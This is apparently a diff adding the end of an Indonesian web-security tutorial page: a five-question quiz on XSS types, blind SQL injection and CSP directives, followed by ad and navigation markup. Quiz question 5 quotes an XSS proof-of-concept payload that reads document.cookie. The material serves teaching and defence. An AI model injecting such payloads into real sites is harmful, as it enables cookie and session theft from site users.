+        <button class="quiz-option" data-question="0" data-answer="d">d. Mengenkripsi seluruh database</button>
+      </div>
+
+      <!-- Q2 -->
+      <div class="quiz-question">
+        <h4>2. Jenis XSS apa yang menyimpan script berbahaya secara permanen di server?</h4>
+        <button class="quiz-option" data-question="1" data-answer="a">a. Reflected XSS</button>
+        <button class="quiz-option" data-question="1" data-answer="b">b. DOM-Based XSS</button>
+        <button class="quiz-option" data-question="1" data-answer="c">c. Stored XSS (Persistent XSS)</button>
+        <button class="quiz-option" data-question="1" data-answer="d">d. Self-XSS</button>
+      </div>
+
+      <!-- Q3 -->
+      <div class="quiz-question">
+        <h4>3. Blind SQL Injection berbeda dari In-Band SQLi karena:</h4>
+        <button class="quiz-option" data-question="2" data-answer="a">a. Tidak bisa mengekstrak data sama sekali</button>
+        <button class="quiz-option" data-question="2" data-answer="b">b. Hanya bisa menyerang database MySQL</button>
+        <button class="quiz-option" data-question="2" data-answer="c">c. Tidak ada output langsung di halaman — data disimpulkan dari perbedaan respon</button>
+        <button class="quiz-option" data-question="2" data-answer="d">d. Menggunakan metode yang berbeda, yaitu file upload</button>
+      </div>
+
+      <!-- Q4 -->
+      <div class="quiz-question">
+        <h4>4. Directive CSP apa yang memblokir eksekusi script inline berbahaya?</h4>
+        <button class="quiz-option" data-question="3" data-answer="a">a. default-src 'self'</button>
+        <button class="quiz-option" data-question="3" data-answer="b">b. script-src 'self' (tanpa 'unsafe-inline')</button>
+        <button class="quiz-option" data-question="3" data-answer="c">c. img-src 'self' data:</button>
+        <button class="quiz-option" data-question="3" data-answer="d">d. frame-ancestors 'none'</button>
+      </div>
+
+      <!-- Q5 -->
+      <div class="quiz-question">
+        <h4>5. Payload `&lt;img src=x onerror="alert(document.cookie)"&gt;` adalah contoh dari:</h4>
+        <button class="quiz-option" data-question="4" data-answer="a">a. SQL Injection</button>
+        <button class="quiz-option" data-question="4" data-answer="b">b. Cross-Site Scripting (XSS)</button>
+        <button class="quiz-option" data-question="4" data-answer="c">c. Cross-Site Request Forgery (CSRF)</button>
+        <button class="quiz-option" data-question="4" data-answer="d">d. Remote Code Execution (RCE)</button>
+      </div>
+
+      <button class="quiz-btn" aria-label="Periksa jawaban kuis">📝 Periksa Jawaban</button>
+      <div class="quiz-result"></div>
+    </div>
+
+    <!-- ====== AD SLOT BOTTOM ====== -->
+    <div class="ad-slot ad-slot-wide" id="ad-slot-bottom">
+      <ins class="adsbygoogle"
+           style="display:block"
+           data-ad-client="ca-pub-2122797411859663"
+           data-ad-format="auto"
+           data-full-width-responsive="true"></ins>
+      <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+    
+
+    <!-- ====== ARTICLE NAVIGATION ====== -->
+    <div class="article-nav">
+      <a href="network-security.html" class="prev">
+        <span class="nav-label">← Sebelumnya</span>
+        <span class="nav-title">Keamanan Jaringan IoT: Firewall, VPN &amp; Enkripsi Data</span>
+      </a>
+      <a href="linux-firewall-hardening.html" class="next">
+        <span class="nav-label">Selanjutnya →</span>
+        <span class="nav-title">Firewall Hardening: Mengamankan Server Linux</span>
+      </a>
+    </div>
+
+  
+    <div class="related-articles">
+      <h3>📚 Artikel Terkait</h3>
+      <div class="related-grid">
+                <a href="/articles/roc-functional.html" class="related-card">
+          <span class="related-category">Other</span>
+          <span class="related-title">Roc: Functional Programming with Abilities, Platforms, da...</span>
+        </a>
+        <a href="/articles/siem-splunk.html" class="related-card">
+          <span class="related-category">Other</span>
+          <span class="related-title">SIEM dengan Splunk: Security Monitoring</span>
+        </a>
+        <a href="/articles/ethical-hacking-dasar.html" class="related-card">
+          <span class="related-category">Other</span>
+          <span class="related-title">Ethical Hacking Dasar: Pengenalan & Metodologi</span>
+        </a>
+
+      </div>
+    </div>
+</article>
+
+  <!-- ========== FOOTER ========== -->
